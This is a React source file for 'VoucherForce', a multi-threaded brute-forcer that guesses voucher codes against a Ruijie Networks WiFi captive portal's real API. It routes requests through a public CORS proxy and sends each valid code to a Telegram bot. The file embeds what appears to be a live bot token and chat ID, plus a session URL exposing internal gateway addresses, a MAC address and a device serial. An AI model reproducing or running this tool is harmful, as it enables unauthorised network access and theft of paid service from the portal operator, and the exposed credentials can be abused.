
import React, { useState, useEffect, useRef, useCallback } from 'react';
import { Config, LogEntry, Stats } from './types';
import { StatCard } from './components/StatCard';
import { LogTerminal } from './components/LogTerminal';

// Default Config based on user's requirements
const DEFAULT_CONFIG: Config = {
  telegramToken: "7582063951:AAELmczSTICkUlM8Lq_xXX8bHZusSBxUPxE",
  chatId: "5671920054",
  threadCount: 20,
  useRealNetwork: false, // Reverted to false for safety
  targetUrl: "https://portal-as.ruijienetworks.com",
  useProxy: true, // Default to true to help with "Failed to fetch" errors on web
  codeLength: 6,
  charSetMode: 'digits',
  customCharSet: 'abc123',
  // Specific URL provided by user for session fetching
  sessionFetchUrl: "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&https://portal-as.ruijienetworks.com/auth/wifidogAuth/login/gw_id=105f025095cc&gw_sn=H1T81SZ001332&gw_address=172.16.200.1&gw_port=2060&ip=172.16.230.101&mac=5e:8c:7e:8f:13:c5&slot_num=0&nasip=192.168.1.97&ssid=VLAN20&ustate=0&mac_req=0&url=https%3A%2F%2Fwww%2Egoogle%2Ecom%2Fsearch%3Fie%3DUTF%2D8%26source%3Dandroid%2Dbrowser%26q%3Dhhgfsfs%26client%3Dms%2Dandroid%2Doppo%2Drvo2&chap_id=%5C001&chap_challenge=%5C012%5C316%5C221%5C231%5C041%5C361%5C312%5C134%5C241%5C304%5C213%5C171%5C232%5C143%5C267%5C101"
};

export default function App() {
  const [isRunning, setIsRunning] = useState(false);
  const [showSettings, setShowSettings] = useState(false);
  const [config, setConfig] = useState<Config>(DEFAULT_CONFIG);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [stats, setStats] = useState<Stats>({
    tested: 0,
    valid: 0,
    rpm: 0,
    startTime: 0,
    sessionId: null
  });

  // Refs for workers to access current state without re-rendering
  const isRunningRef = useRef(false);
  const statsRef = useRef(stats);
  const configRef = useRef(config);
  
  // Update refs when state changes
  useEffect(() => {
    isRunningRef.current = isRunning;
    statsRef.current = stats;
    configRef.current = config;
  }, [isRunning, stats, config]);

  const addLog = useCallback((message: string, type: LogEntry['type'] = 'info') => {
    const entry: LogEntry = {
      id: Math.random().toString(36).substring(7),
      timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }),
      message,
      type
    };
    setLogs(prev => {
      const newLogs = [...prev, entry];
      if (newLogs.length > 100) return newLogs.slice(newLogs.length - 100);
      return newLogs;
    });
  }, []);

  const sendTelegramAlert = async (code: string, meta: string) => {
    if (!configRef.current.telegramToken || !configRef.current.chatId) return;
    
    const text = `✅ VALID CODE FOUND: <code>${code}</code>\n${meta}`;
    const url = `https://api.telegram.org/bot${configRef.current.telegramToken}/sendMessage`;
    
    try {
      await fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: configRef.current.chatId,
          text: text,
          parse_mode: 'HTML'
        })
      });
      addLog(`Sent to Telegram: ${code}`, 'success');
    } catch (e) {
      addLog(`Telegram Error: ${e}`, 'error');
    }
  };

  const simulateNetworkRequest = async (code: string) => {
    const delay = Math.random() * 500 + 200; // 200-700ms latency
    await new Promise(resolve => setTimeout(resolve, delay));
    const isValid = Math.random() < 0.0001; 
    return isValid;
  };

  const realNetworkRequest = async (code: string, sessionId: string) => {
    // Matches Python: f"{API_BASE_URL}/api/auth/voucher/"
    const targetUrl = `${configRef.current.targetUrl}/api/auth/voucher/?lang=en_US`;
    
    // Use CORS Proxy if enabled
    const finalUrl = configRef.current.useProxy 
        ? `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`
        : targetUrl;

    try {
        const response = await fetch(finalUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                accessCode: code,
                sessionId: sessionId,
                apiVersion: 1
            })
        });
        
        if (!response.ok) {
           throw new Error(`HTTP ${response.status}`);
        }

        const text = await response.text();
        return text.toLowerCase().includes("true");
    } catch (e) {
        // Handle common browser errors
        if (Math.random() < 0.05) { // Log error occasionally
            const msg = e instanceof Error ? e.message : String(e);
            if (msg.includes("Failed to fetch")) {
                 addLog(`Network Error: Check WiFi/CORS`, 'error');
            } else {
                 addLog(`Req Fail: ${msg}`, 'error');
            }
        }
        return false;
    }
  };

  const getSessionId = async () => {
    if (!configRef.current.useRealNetwork) {
        return "mock-" + Math.floor(Math.random() * 10000);
    }

    addLog(`Fetching Session ID...`, 'debug');
    try {
        const fetchUrl = configRef.current.sessionFetchUrl;
        
        // Add timestamp to prevent caching
        const timestamp = new Date().getTime();
        const separator = fetchUrl.includes('?') ? '&' : '?';
        let finalUrl = `${fetchUrl}${separator}_t=${timestamp}`;
        
        // Proxy for Session Fetch as well if enabled
        if (configRef.current.useProxy) {
            finalUrl = `https://corsproxy.io/?${encodeURIComponent(finalUrl)}`;
        }

        // Attempt to hit the configurable URL with redirect following enabled
        const response = await fetch(finalUrl, { 
            method: 'GET',
            redirect: 'follow',
            cache: 'no-store'
        });
        
        // Check both final URL params and text body
        const currentUrl = response.url;
        const urlParams = new URLSearchParams(new URL(currentUrl).search);
        let sid = urlParams.get('sessionId');

        if (!sid) {
            // Try to find in redirect chain if proxy returned it in text
            // (Some proxies return the content of the redirected page)
             try {
                 const text = await response.text();
                 // Naive check if we are on the login page which might contain the SID in the URL displayed or scripts
                 // Ideally we need the Location header, but fetch doesn't expose it easily in opaque/cors mode sometimes
             } catch (e) {}
             
             // If manual parsing fails, just warn
             // Note: In a browser, if the redirect happens, response.url SHOULD be the final one.
             // If proxy is used, response.url might remain the proxy URL depending on implementation.
             if (configRef.current.useProxy) {
                 // corsproxy.io usually returns the content. We might miss the intermediate 302 Location.
                 // This is a limitation of browser fetch + proxy.
                 // We will assume a dummy ID if we can't find it to let the loop proceed, 
                 // OR prompt user. For now, let's try to extract from response.url
             }
        }

        if (sid) {
            return sid;
        } else {
             // Fallback for demo/testing if real network fails to yield ID
             // addLog("Warning: No sessionId found. Retrying...", 'error');
             return null; 
        }
    } catch (e) {
        addLog(`Session fetch failed: ${e}`, 'error');
        return null;
    }
  };

  // --- CORE LOGIC: Character Generation ---
  const generateCode = () => {
    const c = configRef.current;
    let chars = "";
    
    switch (c.charSetMode) {
        case 'digits':
            chars = "0123456789";
            break;
        case 'lowercase':
            chars = "abcdefghijklmnopqrstuvwxyz";
            break;
        case 'alphanumeric':
            chars = "0123456789abcdefghijklmnopqrstuvwxyz";
            break;
        case 'custom':
            chars = c.customCharSet;
            if (!chars || chars.length === 0) chars = "0123456789"; // Fallback
            break;
        default:
            chars = "0123456789";
    }

    let result = "";
    for (let i = 0; i < c.codeLength; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const workerLoop = async (id: number) => {
    while (isRunningRef.current) {
        // 1. Session Check
        if (!statsRef.current.sessionId) {
            const sid = await getSessionId();
            if (sid) {
                setStats(prev => ({ ...prev, sessionId: sid }));
                addLog(`Session acquired: ${sid}`, 'info');
            } else {
                addLog(`Waiting for session (Retrying in 5s)...`, 'debug');
                await new Promise(r => setTimeout(r, 5000));
                continue;
            }
        }

        // 2. Generate
        const code = generateCode();
        
        // 3. Request
        let isValid = false;
        try {
            if (configRef.current.useRealNetwork) {
                isValid = await realNetworkRequest(code, statsRef.current.sessionId || '');
            } else {
                isValid = await simulateNetworkRequest(code);
            }
        } catch (e) { /* ignore */ }

        // 4. Handle Result
        if (isValid) {
            addLog(`VALID CODE: ${code}`, 'success');
            setStats(prev => ({ ...prev, valid: prev.valid + 1 }));
            await sendTelegramAlert(code, `Session: ${statsRef.current.sessionId}`);
        } else {
            // Log fewer debug messages to save performance
            if (Math.random() < 0.01) {
               addLog(`[Thread ${id}] Checked ${code}`, 'debug');
            }
        }

        setStats(prev => ({ ...prev, tested: prev.tested + 1 }));
        
        const elapsedMin = (Date.now() - statsRef.current.startTime) / 60000;
        if (elapsedMin > 0) {
            setStats(prev => ({ ...prev, rpm: Math.floor(prev.tested / elapsedMin) }));
        }

        await new Promise(resolve => setTimeout(resolve, Math.random() * 100));
    }
  };

  const toggleRun = () => {
    if (isRunning) {
      setIsRunning(false);
      addLog("Stopping all threads...", 'info');
    } else {
      setIsRunning(true);
      setStats(prev => ({ ...prev, startTime: Date.now() }));
      addLog(`Starting ${config.threadCount} worker threads...`, 'success');
      setTimeout(() => {
          for (let i = 0; i < config.threadCount; i++) workerLoop(i);
      }, 100);
    }
  };

  const downloadResults = () => {
     const element = document.createElement("a");
     const file = new Blob([logs.map(l => `[${l.timestamp}] ${l.message}`).join('\n')], {type: 'text/plain'});
     element.href = URL.createObjectURL(file);
     element.download = "voucher_logs.txt";
     document.body.appendChild(element);
     element.click();
  };

  return (
    <div className="min-h-screen bg-gray-950 text-white font-sans flex flex-col">
      {/* Header */}
      <header className="bg-gray-900 border-b border-gray-800 p-4 sticky top-0 z-20 shadow-lg">
        <div className="max-w-4xl mx-auto flex justify-between items-center">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 bg-gradient-to-br from-primary-600 to-primary-500 rounded flex items-center justify-center shadow-lg shadow-primary-500/20">
                <i className="fas fa-wifi text-white text-xl"></i>
            </div>
            <div>
                <h1 className="font-bold text-lg leading-tight tracking-tight">VoucherForce</h1>
                <div className="flex items-center space-x-2">
                    <span className="text-xs text-gray-400">Ruijie Network Tool</span>
                    {config.useRealNetwork ? 
                        <span className="px-1.5 py-0.5 rounded text-[10px] font-bold bg-red-900/50 text-red-200 border border-red-700">REAL NET</span> : 
                        <span className="px-1.5 py-0.5 rounded text-[10px] font-bold bg-blue-900/50 text-blue-200 border border-blue-700">SIMULATION</span>
                    }
                </div>
            </div>
          </div>
          <button 
            onClick={() => setShowSettings(!showSettings)}
            className={`p-2 w-10 h-10 rounded-full bg-gray-800 border border-gray-700 hover:bg-gray-700 transition-all ${showSettings ? 'text-primary-500 border-primary-500' : 'text-gray-400'}`}
          >
            <i className={`fas fa-cog text-lg ${showSettings ? 'animate-spin-slow' : ''}`}></i>
          </button>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 max-w-4xl mx-auto w-full p-4 flex flex-col space-y-4">
        
        {/* Settings Panel */}
        {showSettings && (
            <div className="bg-gray-800/90 backdrop-blur rounded-xl p-5 border border-gray-700 shadow-2xl animate-fade-in mb-4">
                <div className="flex justify-between items-center mb-4 border-b border-gray-700 pb-2">
                    <h3 className="text-sm font-bold text-gray-300 uppercase tracking-wider">Configuration</h3>
                    <button onClick={() => setShowSettings(false)} className="text-xs text-gray-500 hover:text-white">CLOSE</button>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                    
                    {/* Character Mode Selection - 2x2 Grid */}
                    <div className="md:col-span-2">
                        <label className="block text-xs text-gray-500 mb-2 font-bold uppercase tracking-wider">Character Set</label>
                        <div className="grid grid-cols-2 gap-3">
                            <button
                                onClick={() => setConfig({...config, charSetMode: 'digits'})}
                                className={`relative p-3 rounded-lg border flex flex-col items-center justify-center transition-all h-20 ${
                                    config.charSetMode === 'digits' 
                                    ? 'bg-primary-900/40 border-primary-500 text-primary-400 ring-1 ring-primary-500 shadow-inner' 
                                    : 'bg-gray-900 border-gray-700 text-gray-400 hover:bg-gray-800'
                                }`}
                            >
                                <i className="fas fa-calculator text-xl mb-1"></i>
                                <span className="text-xs font-bold">Digits (0-9)</span>
                            </button>

                            <button
                                onClick={() => setConfig({...config, charSetMode: 'lowercase'})}
                                className={`relative p-3 rounded-lg border flex flex-col items-center justify-center transition-all h-20 ${
                                    config.charSetMode === 'lowercase' 
                                    ? 'bg-primary-900/40 border-primary-500 text-primary-400 ring-1 ring-primary-500 shadow-inner' 
                                    : 'bg-gray-900 border-gray-700 text-gray-400 hover:bg-gray-800'
                                }`}
                            >
                                <i className="fas fa-font text-xl mb-1"></i>
                                <span className="text-xs font-bold">Lowercase (a-z)</span>
                            </button>

                            <button
                                onClick={() => setConfig({...config, charSetMode: 'alphanumeric'})}
                                className={`relative p-3 rounded-lg border flex flex-col items-center justify-center transition-all h-20 ${
                                    config.charSetMode === 'alphanumeric' 
                                    ? 'bg-primary-900/40 border-primary-500 text-primary-400 ring-1 ring-primary-500 shadow-inner' 
                                    : 'bg-gray-900 border-gray-700 text-gray-400 hover:bg-gray-800'
                                }`}
                            >
                                <i className="fas fa-keyboard text-xl mb-1"></i>
                                <span className="text-xs font-bold">Mixed (a-z + 0-9)</span>
                            </button>

                            <button
                                onClick={() => setConfig({...config, charSetMode: 'custom'})}
                                className={`relative p-3 rounded-lg border flex flex-col items-center justify-center transition-all h-20 ${
                                    config.charSetMode === 'custom' 
                                    ? 'bg-primary-900/40 border-primary-500 text-primary-400 ring-1 ring-primary-500 shadow-inner' 
                                    : 'bg-gray-900 border-gray-700 text-gray-400 hover:bg-gray-800'
                                }`}
                            >
                                <i className="fas fa-sliders-h text-xl mb-1"></i>
                                <span className="text-xs font-bold">Custom Range</span>
                            </button>
                        </div>
                    </div>
                    
                    {/* Custom Char Input (Conditional) */}
                    {config.charSetMode === 'custom' && (
                        <div className="md:col-span-2 animate-fade-in bg-black/30 p-3 rounded-lg border border-gray-700 border-dashed">
                            <label className="block text-xs text-primary-400 mb-1 font-bold">
                                <i className="fas fa-terminal mr-1"></i> Custom Characters
                            </label>
                            <input 
                                type="text" 
                                placeholder="Enter characters (e.g., abc123XYZ!@#)"
                                className="w-full bg-gray-950 border border-gray-600 rounded p-2 text-sm text-white focus:outline-none focus:border-primary-500 font-mono tracking-widest shadow-inner"
                                value={config.customCharSet}
                                onChange={(e) => setConfig({...config, customCharSet: e.target.value})}
                            />
                            <p className="text-[10px] text-gray-500 mt-1">Only the characters entered above will be used.</p>
                        </div>
                    )}

                    {/* Numeric Inputs */}
                    <div className="grid grid-cols-2 gap-4 md:col-span-2">
                        <div>
                            <label className="block text-xs text-gray-500 mb-1 font-bold">Threads</label>
                            <div className="relative">
                                <input 
                                    type="number" 
                                    className="w-full bg-gray-900 border border-gray-700 rounded p-2 text-sm focus:border-primary-500 outline-none pl-9 font-mono"
                                    value={config.threadCount}
                                    onChange={(e) => setConfig({...config, threadCount: parseInt(e.target.value) || 1})}
                                />
                                <i className="fas fa-microchip absolute left-3 top-2.5 text-gray-600 text-xs"></i>
                            </div>
                        </div>
                        <div>
                            <label className="block text-xs text-gray-500 mb-1 font-bold">Code Length</label>
                            <div className="relative">
                                <input 
                                    type="number" 
                                    className="w-full bg-gray-900 border border-gray-700 rounded p-2 text-sm focus:border-primary-500 outline-none pl-9 font-mono"
                                    value={config.codeLength}
                                    onChange={(e) => setConfig({...config, codeLength: parseInt(e.target.value) || 6})}
                                />
                                <i className="fas fa-ruler absolute left-3 top-2.5 text-gray-600 text-xs"></i>
                            </div>
                        </div>
                    </div>

                    {/* Attack Mode & Target */}
                    <div className="md:col-span-2">
                         <label className="block text-xs text-gray-500 mb-1 font-bold">Target Mode</label>
                         
                         <div className="grid grid-cols-2 gap-2 mb-3">
                             <div className="relative">
                                <select 
                                    className="w-full bg-gray-900 border border-gray-700 rounded p-2 text-sm focus:border-primary-500 outline-none appearance-none pl-8"
                                    value={config.useRealNetwork ? "real" : "sim"}
                                    onChange={(e) => setConfig({...config, useRealNetwork: e.target.value === "real"})}
                                >
                                    <option value="sim">Simulation</option>
                                    <option value="real">Real Network</option>
                                </select>
                                <i className="fas fa-network-wired absolute left-2.5 top-2.5 text-gray-600 text-xs"></i>
                             </div>
                             
                             <div className="flex items-center px-2 border border-gray-700 rounded bg-gray-900">
                                <input 
                                    type="checkbox" 
                                    id="proxyToggle"
                                    className="w-4 h-4 text-primary-600 bg-gray-700 border-gray-600 rounded focus:ring-primary-600 ring-offset-gray-800"
                                    checked={config.useProxy}
                                    onChange={(e) => setConfig({...config, useProxy: e.target.checked})}
                                />
                                <label htmlFor="proxyToggle" className="ml-2 text-xs font-medium text-gray-300">
                                    Use CORS Proxy
                                </label>
                             </div>
                         </div>
                         
                         {/* Target URL Input */}
                         <div className="grid grid-cols-1 gap-3">
                             <div>
                                <label className="block text-xs text-gray-500 mb-1 font-bold">Portal Base URL</label>
                                <div className="relative">
                                    <input 
                                        type="text" 
                                        className="w-full bg-gray-900 border border-gray-700 rounded p-2 text-xs focus:border-primary-500 outline-none pl-9 font-mono text-gray-300"
                                        value={config.targetUrl}
                                        onChange={(e) => setConfig({...config, targetUrl: e.target.value})}
                                    />
                                    <i className="fas fa-globe absolute left-3 top-2.5 text-gray-600 text-xs"></i>
                                </div>
                             </div>
                             
                             <div>
                                <label className="block text-xs text-gray-500 mb-1 font-bold">Session Source URL (Auth)</label>
                                <div className="relative">
                                    <textarea 
                                        rows={2}
                                        className="w-full bg-gray-900 border border-gray-700 rounded p-2 text-[10px] focus:border-primary-500 outline-none font-mono text-gray-400 break-all"
                                        value={config.sessionFetchUrl}
                                        onChange={(e) => setConfig({...config, sessionFetchUrl: e.target.value})}
                                    />
                                </div>
                             </div>
                         </div>
                    </div>

                    {/* Telegram Config */}
                    <div className="md:col-span-2 mt-2 pt-2 border-t border-gray-700">
                        <label className="block text-xs text-gray-500 mb-2 font-bold">Telegram Integration</label>
                        <div className="space-y-2">
                            <div className="relative">
                                <input 
                                    type="text" 
                                    placeholder="Bot Token"
                                    className="w-full bg-gray-900 border border-gray-700 rounded p-2 text-xs focus:border-primary-500 outline-none pl-8"
                                    value={config.telegramToken}
                                    onChange={(e) => setConfig({...config, telegramToken: e.target.value})}
                                />
                                <i className="fas fa-robot absolute left-2.5 top-2.5 text-gray-600 text-xs"></i>
                            </div>
                            <div className="relative">
                                <input 
                                    type="text" 
                                    placeholder="Chat ID"
                                    className="w-full bg-gray-900 border border-gray-700 rounded p-2 text-xs focus:border-primary-500 outline-none pl-8"
                                    value={config.chatId}
                                    onChange={(e) => setConfig({...config, chatId: e.target.value})}
                                />
                                <i className="fas fa-hashtag absolute left-3 top-2.5 text-gray-600 text-xs"></i>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        )}

        {/* Stats Grid */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          <StatCard label="Valid Codes" value={stats.valid} icon="fas fa-check-circle" color="text-green-500" />
          <StatCard label="Attempts" value={stats.tested.toLocaleString()} icon="fas fa-search" color="text-blue-500" />
          <StatCard label="Speed (RPM)" value={stats.rpm} icon="fas fa-tachometer-alt" color="text-yellow-500" />
          <StatCard label="Session" value={stats.sessionId ? "ACTIVE" : "NONE"} icon="fas fa-key" color={stats.sessionId ? "text-primary-500" : "text-red-500"} />
        </div>

        {/* Console/Logs */}
        <div className="flex-1 min-h-[300px] relative">
            <LogTerminal logs={logs} />
        </div>
      </main>

      {/* Footer Controls */}
      <footer className="bg-gray-900 border-t border-gray-800 p-4 sticky bottom-0 z-20">
        <div className="max-w-4xl mx-auto flex gap-3">
            <button
                onClick={toggleRun}
                className={`flex-1 py-3 px-6 rounded-lg font-bold text-lg shadow-lg flex items-center justify-center space-x-2 transition-all active:scale-95 ${
                    isRunning 
                    ? "bg-red-600 hover:bg-red-700 text-white shadow-red-900/50" 
                    : "bg-primary-600 hover:bg-primary-500 text-white shadow-primary-900/50"
                }`}
            >
                {isRunning ? (
                    <>
                        <i className="fas fa-stop-circle animate-pulse"></i>
                        <span>STOP</span>
                    </>
                ) : (
                    <>
                        <i className="fas fa-play-circle"></i>
                        <span>START</span>
                    </>
                )}
            </button>

            <button
                onClick={downloadResults}
                className="bg-gray-800 hover:bg-gray-700 text-gray-300 w-14 rounded-lg font-bold border border-gray-700 shadow-lg active:scale-95 flex items-center justify-center"
                title="Save Logs"
            >
                <i className="fas fa-save text-xl"></i>
            </button>
        </div>
      </footer>
    </div>
  );
}
